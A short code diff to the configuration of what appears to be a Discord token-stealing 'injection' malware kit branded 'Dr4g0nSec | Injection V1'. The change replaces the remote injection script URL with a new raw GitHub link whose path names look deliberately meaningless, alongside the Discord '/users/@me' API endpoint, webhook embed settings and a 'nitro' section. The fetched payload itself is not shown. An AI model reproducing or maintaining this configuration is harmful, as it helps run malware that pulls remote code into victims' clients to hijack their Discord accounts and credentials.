@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Dr4g0nSec | Injection V1', 
   embed_icon: 'https://i.imgur.com/83uCFZe.jpeg', 
   embed_color: 0x250e80,
-  injection_url: 'https://raw.githubusercontent.com/sk4rtyxz/IJ/refs/heads/main/J/1NJ3.js', 
+  injection_url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/ae6f117592b7.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
